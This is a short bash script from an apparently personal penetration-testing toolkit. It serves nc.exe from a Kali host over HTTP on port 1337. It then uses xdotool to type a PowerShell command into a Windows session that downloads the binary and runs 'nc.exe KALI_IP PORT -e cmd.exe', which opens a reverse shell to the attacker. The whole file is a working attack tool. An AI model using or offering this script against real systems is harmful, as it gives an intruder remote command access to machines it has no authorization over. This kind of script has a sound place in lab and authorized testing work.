#!/bin/bash

: '
download nc file and execute nc shell
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Shell port"

PORT=${form_data["Shell port"]}

cd ~/Desktop/base/code/xdotool/scripts/fileTransfer/windows/.binaries
python3 -m http.server 1337 &
HTTP_PID=$!

paste_command "powershell -c 'curl http://${KALI_IP}:1337/nc.exe -o nc.exe';nc.exe ${KALI_IP} ${PORT} -e cmd.exe"
xdotool key Return
sleep 10

kill $HTTP_PID